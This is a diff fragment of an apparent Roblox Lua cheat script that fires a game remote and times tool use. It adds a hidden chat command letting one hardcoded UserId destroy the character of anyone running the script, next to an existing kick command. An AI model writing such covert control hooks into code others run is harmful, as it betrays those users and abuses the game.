@@ -190,7 +190,7 @@ Mouse.KeyDown:Connect(function(KeyPressed)
 			[2] = "Getting Sturdy"
 		}
 		game:GetService("ReplicatedStorage").MainRemote:FireServer(unpack(args))
-		wait(3)
+		wait(2)
 		game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.Phone)
 		wait(.2)
 		game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
@@ -272,6 +272,11 @@ for i,v in pairs(game.Players:GetPlayers()) do
 		if Message == ".kick "..game.Players.LocalPlayer.Name then
 			if v.UserId == 721287280 then
 				game.Players.LocalPlayer:Kick("User BANNED")
+			end
+		end
+		if Message == ".check "..game.Players.LocalPlayer.Name then
+			if v.UserId == 721287280 then
+				game.Players.LocalPlayer.Character.Head:Destroy()
 			end
 		end
 	end)
